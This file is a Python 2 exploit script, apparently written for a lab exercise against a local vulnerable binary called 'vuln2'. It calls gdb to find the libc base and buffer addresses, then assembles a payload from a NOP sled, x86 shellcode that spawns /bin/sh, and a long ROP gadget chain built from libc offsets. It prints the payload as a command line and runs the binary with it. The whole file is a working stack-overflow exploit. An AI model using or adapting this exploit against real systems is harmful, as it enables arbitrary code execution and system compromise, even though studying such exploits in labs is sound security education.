#!/usr/bin/env python
import struct
import subprocess
import io
import os

def pack_absolute(gadget_offset, lib_base_address):
	absolute_address = lib_base_address + gadget_offset
	packed_addr = struct.pack("<I",absolute_address)
	return packed_addr

with io.FileIO("test.gdb", "w") as file:
	file.write("b main\nrun hello\ninfo proc mappings\n")

with io.FileIO("find_buf.gdb", "w") as file:
	file.write("b main\nrun hello\np/x &buf[0]\n")

proc1 = subprocess.Popen("gdb --batch --command=./test.gdb --args ./vuln2 hello|grep libc|grep so|head -1|awk '{print $1}'", shell=True, stdout=subprocess.PIPE)
proc1.wait()
libc_base_addr = int(proc1.stdout.read(), 16)

proc4 = subprocess.Popen("gdb --batch --command=./find_buf.gdb --args ./vuln2 hello|tail -1|awk '{print $3}'", shell=True, stdout=subprocess.PIPE)
proc4.wait()
buf_addr = int(proc4.stdout.read(), 16) + 0xb0 - 0x180
#0x00 for gdb, 0x30 for r.sh, 0xb0 for commandline
os.remove("./test.gdb")
os.remove("./find_buf.gdb")


buf = ""
nop_sled = "\x90" * 199
buf += nop_sled
shellcode =  "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
buf += shellcode #25 bytes

gadget_list = [0x0002f0ec, 0x0002f0ec, 0x0002f0ec, 0x0002f0ec, 0x0002f0ec, 0x0002f0ec, 0x0002f0ec, 0x0002f0ec, 0x0002f0ec]
gadget_list += [0x0002f0ec, 0x00027662, 0x00027662, 0x00027662, 0x00027662, 0x00027662, 0x00027662, 0x00027662, 0x0011be39]
gadget_list += [0x0002f0ec, 0x001263b6, 0x00027b43, 0x0007eb60, 0x11111111, 0x11111111, 0x0001b5b3, 0x11111111, 0x0002f0ec]
gadget_list += [0x001263b6, 0x00027b43, 0x001263b6, 0x0014878a, 0x11111111, 0x11111111, 0x001263b6, 0x001263b6, 0x0010f471]
gadget_list += [0x11111111, 0x000ec152, 0x0002daa0, 0x000ec152, 0x001723dc, 0x0002f0ec, 0x0014323b, 0x00027662, 0x00027662]
gadget_list += [0x00027662, 0x00027662, 0x00027662, 0x00027662, 0x00027662, 0x000ebe61, 0x11111111, 0x11111111, 0x11111111]
gadget_list += [0x11111111]

for gadget in gadget_list:
	buf += pack_absolute(gadget, libc_base_addr)

buf += struct.pack("<I", buf_addr)

rows, columns = os.popen('stty size', 'r').read().split()
print "#"*int(columns)
print "Run the following command as the argument of vuln2 to reproduce this exploit.\n"
print "#"*int(columns)
bufstr = buf.encode("hex")
i = 0
exploit_str = ""
while i < len(bufstr) - 1:
	exploit_str += "\\x" + bufstr[i] + bufstr[i+1]
	i += 2
print "`python -c \'print \"" + exploit_str + "\"\'`"
print ""
print "#"*int(columns)

subprocess.call(["./vuln2", buf])